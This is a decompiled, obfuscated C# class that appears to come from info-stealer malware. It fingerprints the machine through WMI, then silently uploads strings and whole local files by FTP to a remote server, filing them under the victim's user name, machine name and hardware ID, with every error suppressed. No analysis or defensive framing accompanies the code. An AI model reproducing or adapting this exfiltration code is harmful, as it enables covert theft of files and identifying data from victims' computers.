using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bmDbQpaZORfnY;

internal sealed class XWEZyRndCFE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string HppztbCiyZDw()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107404823));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404770)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107404785);
			ManagementObject val3 = new ManagementObject(getString_0(107404780) + text2 + getString_0(107404707));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107404702)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107391621) : text;
		}
	}

	public static void STFcAtlvEC(string jGOOZkGrjN = "URL", string seDvpyIOINtpds = "USERNAME", string dBGkMGhHttMs = "ACCESO", string bLqxERwgraWuQ = "")
	{
		try
		{
			string text = HppztbCiyZDw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(jGOOZkGrjN + getString_0(107406416) + Environment.UserName + getString_0(107406371) + Environment.MachineName + getString_0(107406382) + text + getString_0(107406345));
			ftpWebRequest.Method = getString_0(107404165);
			ftpWebRequest.Credentials = new NetworkCredential(seDvpyIOINtpds, dBGkMGhHttMs);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(bLqxERwgraWuQ);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void iNNSScDiDt(string HCwDfJSyzsQKOJ = "URL", string zcoXRuPqiy = "USERNAME", string zZFskqUjDCQO = "ACCESO", string KJWALWkyJzU = "")
	{
		try
		{
			string text = HppztbCiyZDw();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(HCwDfJSyzsQKOJ + getString_0(107406416) + Environment.UserName + getString_0(107406371) + Environment.MachineName + getString_0(107406382) + text + getString_0(107406382) + Path.GetFileName(KJWALWkyJzU));
			ftpWebRequest.Method = getString_0(107404165);
			ftpWebRequest.Credentials = new NetworkCredential(zcoXRuPqiy, zZFskqUjDCQO);
			byte[] array = File.ReadAllBytes(KJWALWkyJzU);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static XWEZyRndCFE()
	{
		Strings.CreateGetStringDelegate(typeof(XWEZyRndCFE));
	}
}
